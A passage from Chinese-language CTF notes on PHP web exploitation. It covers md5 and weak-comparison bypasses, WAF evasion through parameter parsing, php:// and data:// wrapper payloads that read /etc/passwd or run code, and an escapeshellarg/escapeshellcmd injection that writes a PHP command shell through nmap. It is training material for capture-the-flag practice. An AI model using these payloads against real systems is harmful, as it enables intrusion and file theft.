</span></span></code></pre></td></tr></table></div></div><ul><li>这个匹配的是 <code>|\</code></li></ul><p>先由 php 解析器解析为 <code>\|\\</code> ，再由正则解析为 `|\</p><hr><h1 id=技巧>技巧</h1><h2 id=读取文件新姿势>读取文件新姿势</h2><h3 id=highlight-高亮输出>highlight 高亮输出</h3><p>highlight 高亮输出 + glob 搜索并返回第一个元素</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=s2>&#34;highlight_file(glob(&#34;</span><span class=o>/</span><span class=nx>f</span><span class=o>*</span><span class=s2>&#34;)[0]);&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>highlight_file 是 php 的函数</li></ul><h3 id=无特殊字符的纯函数读取>无特殊字符的纯函数读取</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>scandir<span class=o>(</span>current<span class=o>(</span>localeconv<span class=o>()))</span>
</span></span><span class=line><span class=cl><span class=c1># localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls</span>
</span></span><span class=line><span class=cl><span class=c1># current() 返回数组中当前元素的值</span>
</span></span><span class=line><span class=cl><span class=c1># scandir()就是列出目录中的文件和目录</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 打印</span>
</span></span><span class=line><span class=cl>print_r<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>print_r<span class=o>(</span>scandir<span class=o>(</span>current<span class=o>(</span>localeconv<span class=o>())))</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1># 查看调试信息</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 定位</span>
</span></span><span class=line><span class=cl><span class=c1># array_reverse() 反转数组</span>
</span></span><span class=line><span class=cl><span class=c1># next() 指向下一个 (第二个)</span>
</span></span><span class=line><span class=cl>next<span class=o>(</span>array_reverse<span class=o>(</span>scandir<span class=o>(</span>current<span class=o>(</span>localeconv<span class=o>()))))</span>
</span></span><span class=line><span class=cl><span class=c1># 此处指倒数第二个数组元素</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload</span>
</span></span><span class=line><span class=cl><span class=c1># highlight 读取文件</span>
</span></span><span class=line><span class=cl>highlight_file<span class=o>(</span>next<span class=o>(</span>array_reverse<span class=o>(</span>scandir<span class=o>(</span>current<span class=o>(</span>localeconv<span class=o>())))))</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=弱比较>弱比较</h2><p><code>==</code> 是PHP弱比较逻辑运算符</p><h3 id=整数-和-字符串-的弱比较>整数 和 字符串 的弱比较</h3><p>尝试将字符串转换为整数，规则同 <code>intval()</code>，再比大小</p><ul><li>123a == 123</li><li>例如，payload为123a可以绕过 is_numeric函数</li></ul><h3 id=弱比较和强比较的区别>弱比较和强比较的区别</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>==  和 !=  左右两边数据类型不同时，会将他们转化成同一格式进行比较。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>=== 和 !== 左右两边数据类型不同时，则返回false
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=科学记数法>科学记数法</h2><ul><li>用于限制数字长度的题</li></ul><p>1000000000 = 1e9</p><hr><h2 id=绕过md5>绕过md5</h2><h3 id=数组绕过>数组绕过</h3><p>md5无法比较数组，对于数组，md5会返回NULL，所以相等，可以绕过比较</p><ul><li>返回null，在强比较里面<code>null=null</code>也为 True，所以也可以绕过强比较</li></ul><h4 id=实例>实例</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;!--</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;b&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$a</span> <span class=o>!=</span> <span class=nv>$b</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$b</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=c1>//flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>--&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?a[]=1&amp;b[]=2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># md5($a) == md5($b) returns true
</span></span></code></pre></td></tr></table></div></div><h3 id=科学计数绕过>科学计数绕过</h3><ul><li>只能绕过弱比较<code>==</code>，不能绕过<code>===</code></li></ul><p>原理：在 php 中，当字符串以0e开头时，会被 php 识别成==科学计数法==，结果均为0，因此在比较两个以 <code>0e</code> 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。</p><ul><li>所以关键在于找到md5值为0e开头的字符串</li></ul><p>常用 MD5 值以 0e 开头的字符串：</p><div class=table-wrapper><table><thead><tr><th>字符串</th><th>MD5 值</th></tr></thead><tbody><tr><td>QNKCDZO</td><td>0e830400451993494058024219903391</td></tr><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e342768416822451524974117254469</td></tr><tr><td>0e215962017</td><td>0e291242476940776845150308577824</td></tr></tbody></table></div><ul><li>最后一个很特殊，<strong>原字符串和 md5 值都是 0e 开头</strong>，可以绕过 <code>md($a) == $a</code> 的情况</li><li>更多： <a class=link href=https://github.com/spaze/hashes target=_blank rel=noopener>GitHub - spaze/hashes: Magic hashes – PHP hash &ldquo;collisions&rdquo;</a></li></ul><p>payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?a=QNKCDZO&amp;b=s878926199a
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># md5($a) == md5($b) returns true
</span></span></code></pre></td></tr></table></div></div><h3 id=md5-碰撞>md5 碰撞</h3><ul><li><a class=link href=../%e5%b7%a5%e5%85%b7/fastcoll.md>fastcoll</a></li></ul><p>找到两个真实的 md5 值一样的字符串绕过对字符串 md5 的强等于条件。</p><p>最终找到的两个 md5 值一样的字符串一般是乱码，需要经过 urlencode 再POST给服务器。</p><ul><li>hackbar 不能直接 post 经过 URL编码之后的数据，必须通过 burp 发包</li><li>hackbar 直接输入的是原始数据，会在发包的时候经过一次 URL 编码，所以直接在 hackbar 输入 URL 编码之后的数据会再次被 URL 编码，导致出错</li></ul><p>收集：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
</span></span><span class=line><span class=cl>TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
</span></span></code></pre></td></tr></table></div></div><h3 id=哈希长度拓展攻击>哈希长度拓展攻击</h3><ul><li>工具目录：<code>/Users/jz/Code/CTF/tools/attack-scripts/logic</code></li></ul><p>使用工具，攻击者能够根据<strong>已知哈希值</strong>、<strong>原始消息长度</strong>、结尾需要附加的<strong>新数据</strong>，计算出原始消息需要附加的<strong>完整附加数据</strong>以及<strong>整个消息的新哈希值</strong>。</p><ul><li>原理：利用填充函数将消息扩展为压缩函数能处理的<strong>固定长度的倍数</strong></li><li>所以不能仅仅附加需要的数据，只能做到以所要求的数据结尾</li><li>==原始消息需要附加的完整附加数据 是 包含结尾需要附加的新数据的<strong>更长的字符串==</strong></li><li>在原始消息的基础上，不是仅仅附加了需要附加的新数据，是附加了一串<strong>更长的数据</strong>，需要附加的完整新数据最终可以做到以所要求的新数据结尾，所以整个完整的消息也是以所要求的新数据结尾</li></ul><h4 id=判断-php-生成字符串长度>判断 php 生成字符串长度</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$str</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span> <span class=o>.</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span> <span class=o>.</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>randomb_bytes 生成 16 字节</li><li>bin2hex 对每个字节生成两个16进制字符 得到32个字符</li><li>三个拼接得到96个字符</li></ul><hr><h2 id=php字符串解析特性>php字符串解析特性</h2><ol><li>removes initial whitespace</li><li>converts some characters to underscore (including whitespace)</li></ol><div class=table-wrapper><table><thead><tr><th>USER INPUT</th><th>DECODED</th><th>PHP VARIABLE NAME</th></tr></thead><tbody><tr><td>%20foo_bar%00</td><td>foo_bar</td><td>foo_bar</td></tr><tr><td>foo%20bar%00</td><td>foo bar</td><td>foo_bar</td></tr><tr><td>foo%5bbar</td><td>foo[bar</td><td>foo_bar</td></tr></tbody></table></div><h3 id=绕过waf>绕过WAF</h3><p>可以在用户输入时，利用字符串解析特性输入变形后的变量，导致php语法中可以正常检测到（传入的get/post）变量，同时，WAF等检测规则（waf等不具有php字符串解析特性）无法识别到相应黑名单/block规则中的变量，形成bypass</p><h4 id=实例-1>实例</h4><p>对于一个存在检测是否是数字的WAF，传入变量为num，可以构造payload：<code>?%20num=phpinfo()</code></p><ul><li><code>%20num</code> 在php语法中，被解析成<code>num</code>变量，进入后续的eval木马中执行相应的注入代码</li><li><code>%20num</code> 在WAF检测中，无法被解析成num，故对num的检测没有执行，发生bypass</li></ul><hr><h2 id=publicprotectedprivate的区别>public、protected、private的区别</h2><p>public 表示全局，类内部外部子类都可以访问；<br>**private表示私有的，只有本类内部可以使用； **
protected表示受保护的，只有本类或子类或父类中可以访问</p><hr><h2 id=魔术方法>魔术方法</h2><p>PHP中把以两个下划线 <code>__</code> 开头的方法称为魔术方法(Magic methods)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>__construct</span><span class=p>()</span> <span class=err>当一个对象创建时被调用，反序列化不触发</span>
</span></span><span class=line><span class=cl><span class=n>__destruct</span><span class=p>()</span>  <span class=err>当一个对象销毁时被调用</span>
</span></span><span class=line><span class=cl><span class=n>__toString</span><span class=p>()</span>  <span class=err>当一个对象被当作一个字符串使用，比如</span><span class=n>echo输出或用</span> <span class=o>.</span> <span class=err>和字符串拼接</span>
</span></span><span class=line><span class=cl><span class=n>__call</span><span class=p>()</span>      <span class=err>当调用的方法不存在时触发</span>
</span></span><span class=line><span class=cl><span class=n>__invoke</span><span class=p>()</span>    <span class=err>当一个对象被当作函数调用时触发</span>
</span></span><span class=line><span class=cl><span class=n>__wakeup</span><span class=p>()</span>    <span class=err>反序列化时自动调用</span>
</span></span><span class=line><span class=cl><span class=n>__get</span><span class=p>()</span>       <span class=err>类中的属性私有或不存在触发</span>
</span></span><span class=line><span class=cl><span class=n>__set</span><span class=p>()</span>       <span class=err>类中的属性私有或不存在触发</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=非法参数名传参>非法参数名传参</h2><ul><li><a class=link href=https://blog.csdn.net/mochu7777777/article/details/115050295 target=_blank rel=noopener>谈一谈PHP中关于非法参数名传参问题_arr4y非法传参-CSDN博客</a></li><li>注意：只发送在PHP版本小于8时，当PHP版本大于等于8并不会出现以下介绍的转换错误</li></ul><p>当变量名中出现 <code>.</code> 和 <code>空格</code> 时，PHP 会把它们转换成下划线</p><p>但是，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，接下来如果该参数名中还有<code>非法字符</code> 并不会继续转换成下划线<code>_</code>，忽略后面所有错误。</p><h4 id=实例-2>实例</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$zj</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;z j.&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 传入参数     $zj       实际变量
</span></span></span><span class=line><span class=cl><span class=c1># ?z j.=1     NULL      z_j_
</span></span></span><span class=line><span class=cl><span class=c1># ?z[j.=1     NULL      z_j.
</span></span></span></code></pre></td></tr></table></div></div><ul><li>当传入 <code>?z j.=1</code> 时，虽然 $zj 变量仍然是空的，但是存在 <code>$_REQUEST['z_j_']</code></li><li><code>$_GET</code> 会自动对参数调用 urldecode，所以得到的参数键值对的数组中的值都是字符串。</li></ul><hr><h2 id=php-伪协议>php 伪协议</h2><p>伪协议是<strong>一种特殊的协议，用于访问不同的数据源</strong>。</p><p>它们并不是真正的网络协议，而是一种封装协议，使得PHP能够以特定的方式<strong>访问和操作数据</strong>。 PHP提供了多种伪协议，每种伪协议都有其特定的用途和功能。</p><h3 id=file>file://</h3><p>一般用于访问本地文件</p><ul><li>绝对路径、相对路径、网络路径</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?file<span class=o>=</span>file:///etc/passswd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?url<span class=o>=</span>/?url<span class=o>=</span>file:///var/www/html/index.php <span class=c1># 访问index.php</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=php>php://</h3><p>访问各个输入输出流</p><p>常用： <code>php://filter</code> 用于<strong>读取源码</strong>，<code>php://input</code> 用于<strong>执行php代码</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># base64 输出</span>
</span></span><span class=line><span class=cl>php://filter/read<span class=o>=</span>convert.base64-encode/resource<span class=o>=[</span>文件名<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=c1># 适用于 include 读文件</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 在数据流中写入 POST 的数据</span>
</span></span><span class=line><span class=cl>php://input
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 读取实例</span>
</span></span><span class=line><span class=cl>?cmd<span class=o>=</span>php://filter/read<span class=o>=</span>convert.base64-encode/resource<span class=o>=[</span>文件名<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=data>data://</h3><p>数据流封装器，以<strong>传递相应格式的数据</strong>。可以用来执行PHP代码。一般需要用到<code>base64编码</code>传输。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=data://text/plain,xxxx
</span></span><span class=line><span class=cl>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
</span></span></code></pre></td></tr></table></div></div><h3 id=实例-3>实例</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$text</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span><span class=o>===</span><span class=s2>&#34;welcome to the zjctf&#34;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>要求从文件里读取字符串，与 welcome to the zjctf 相等</li></ul><p>可以用 <code>data://</code> 和 <code>php://</code> 协议，将数据流重定向到用户可以控制的输入流</p><p>构造 payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>?text<span class=o>=</span>data://text/plain,welcome to the zjctf
</span></span><span class=line><span class=cl><span class=c1># 相当于 封装了一个虚拟的文件 内容是 welcome to the zjctf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 或者</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?text<span class=o>=</span>php://input 
</span></span><span class=line><span class=cl><span class=c1># 同时 POST数据：welcome to the zjctf</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=escapeshellarg-和-escapeshellcmd>escapeshellarg 和 escapeshellcmd</h2><h3 id=escapeshellarg>escapeshellarg</h3><ul><li><a class=link href=https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html#0x02-escapeshellarg target=_blank rel=noopener>0x02 escapeshellarg为什么没有奏效？</a></li><li><a class=link href=http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/ target=_blank rel=noopener>浅谈escapeshellarg逃逸与参数注入 \[ Mi1k7ea \]</a></li></ul><p>escapeshellarg 会给没有单引号的字符串加上单引号；对于有单引号的字符串，会先对单引号转义，再以单引号为分割，对各部分的字符串加上单引号。</p><p>测试功能：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$str1</span> <span class=o>=</span> <span class=s2>&#34;ls&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$str2</span> <span class=o>=</span> <span class=s2>&#34;ls -al&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$str3</span> <span class=o>=</span> <span class=s2>&#34;ls&#39;zj&#34;</span><span class=p>;</span>    
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$str1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$str2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$str3</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>string(4) &#34;&#39;ls&#39;&#34;
</span></span><span class=line><span class=cl>string(8) &#34;&#39;ls -al&#39;&#34;
</span></span><span class=line><span class=cl>string(10) &#34;&#39;ls&#39;\&#39;&#39;zj&#39;&#34;
</span></span></code></pre></td></tr></table></div></div><h3 id=escapeshellcmd>escapeshellcmd</h3><p>反斜线<code>\</code> 会在以下字符之前插入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> &amp;#;`|*?~&lt;&gt;^()[]{}$\   \x0A   \xFF
</span></span></code></pre></td></tr></table></div></div><ul><li>不成对的引号也会被转义</li><li>在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替</li></ul><p>测试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$str1</span> <span class=o>=</span> <span class=s2>&#34;ls&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$str2</span> <span class=o>=</span> <span class=s2>&#34;ls;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$str3</span> <span class=o>=</span> <span class=s2>&#34;&#39;;ls;&#34;</span><span class=p>;</span>    
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$str1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$str2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>var_dump</span><span class=p>(</span><span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$str3</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>结果：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>string(2) &#34;ls&#34;
</span></span><span class=line><span class=cl>string(4) &#34;ls\;&#34;
</span></span><span class=line><span class=cl>string(8) &#34;\&#39;\;ls\;&#34;
</span></span></code></pre></td></tr></table></div></div><h3 id=对于-arg--cmd-的参数注入>对于 arg + cmd 的参数注入</h3><p>测试：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>  
</span></span><span class=line><span class=cl>	<span class=nv>$str1</span> <span class=o>=</span> <span class=s2>&#34;zj&#39; -l &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nx>system</span><span class=p>(</span><span class=nx>escapeshellcmd</span><span class=p>(</span><span class=s2>&#34;ls --ignore=&#34;</span><span class=o>.</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$str1</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34; /tmp&#34;</span><span class=p>));</span>  
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=s2>&#34;ls --ignore=&#34;</span><span class=o>.</span><span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$str1</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34; /tmp&#34;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><ul><li>ignore 参数需要 linux 环境</li></ul><p>结果：
<img src=/img/Pasted%20image%2020241008025618.png loading=lazy></p><ul><li><code>ls --ignore='zj'\\'' -l \' /tmp</code> 可化简 <code>ls --ignore=zj\ -l ' /tmp</code></li></ul><p>当用户输入包含单引号时，先用 escapeshellarg() 处理会给该单引号添加转义符，再用 escapeshellcmd() 处理时会将该添加的转义符再添加一个转义符，从而导致注入内容可以从==shellarg的单引号中逃逸掉==，造成后续可以进一步利用的参数注入漏洞。</p><ul><li>如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞</li></ul><h4 id=实战-buuctf-2018online-tool>实战： BUUCTF 2018&mdash;Online Tool</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$host</span> <span class=o>=</span> <span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span><span class=o>.</span><span class=nv>$host</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?host=2.2.2.2&#39;&lt;?php echo `cat /flag`;?&gt; -oG test.php&#39;
</span></span></code></pre></td></tr></table></div></div><ul><li>-oG 是 nmap 的参数，表示写入前一个参数的内容到后一个参数所指明的文件中</li></ul><hr><h2 id=变量覆盖>变量覆盖</h2><h4 id=例题>例题</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
